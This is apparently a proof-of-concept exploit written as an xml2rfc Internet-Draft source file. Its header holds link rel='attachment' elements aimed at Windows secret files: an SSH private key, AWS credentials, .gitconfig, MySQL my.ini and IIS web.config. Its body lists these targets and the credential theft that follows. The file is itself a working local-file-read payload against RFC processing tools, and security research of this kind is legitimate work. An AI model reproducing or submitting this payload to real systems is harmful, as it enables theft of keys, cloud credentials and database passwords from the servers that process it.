<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rfc SYSTEM "rfc2629.dtd">
<rfc version="3" ipr="trust200902" docName="draft-poc-windows-creds-00" category="info" submissionType="IETF">
  <link rel="attachment" href="C:/Users/Administrator/.ssh/id_rsa"/>
  <link rel="attachment" href="C:/Users/Administrator/.aws/credentials"/>
  <link rel="attachment" href="C:/Users/Administrator/.gitconfig"/>
  <link rel="attachment" href="C:/ProgramData/MySQL/my.ini"/>
  <link rel="attachment" href="C:/inetpub/wwwroot/web.config"/>
  <front>
    <title>POC for Windows Credentials and Configuration Files</title>
    <author fullname="Security Researcher" initials="S." surname="Researcher">
      <organization>Security Research Lab</organization>
      <address>
        <email>security@example.com</email>
      </address>
    </author>
    <date year="2025" month="November" day="22"/>
    <area>Security</area>
    <workgroup>Security Testing</workgroup>
    <abstract>
      <t>This proof of concept demonstrates reading Windows user credentials and
      application configuration files containing sensitive information such as SSH keys,
      AWS credentials, database passwords, and IIS configuration.</t>
    </abstract>
  </front>
  <middle>
    <section anchor="intro">
      <name>Introduction</name>
      <t>This POC targets sensitive Windows files that commonly contain credentials
      and configuration data.</t>
    </section>
    <section anchor="targets">
      <name>Targeted Files</name>
      <t>The following sensitive Windows files are targeted:</t>
      <ul>
        <li>C:/Users/Administrator/.ssh/id_rsa - SSH private key</li>
        <li>C:/Users/Administrator/.aws/credentials - AWS access credentials</li>
        <li>C:/Users/Administrator/.gitconfig - Git configuration (may contain tokens)</li>
        <li>C:/ProgramData/MySQL/my.ini - MySQL database configuration</li>
        <li>C:/inetpub/wwwroot/web.config - IIS web application configuration</li>
      </ul>
    </section>
    <section anchor="impact">
      <name>Security Impact</name>
      <t>Successful exploitation allows attackers to:</t>
      <ul>
        <li>Obtain SSH private keys for remote access</li>
        <li>Steal AWS credentials for cloud resource access</li>
        <li>Extract database connection strings and passwords</li>
        <li>Read IIS application settings and connection strings</li>
      </ul>
    </section>
  </middle>
  <back/>
</rfc>
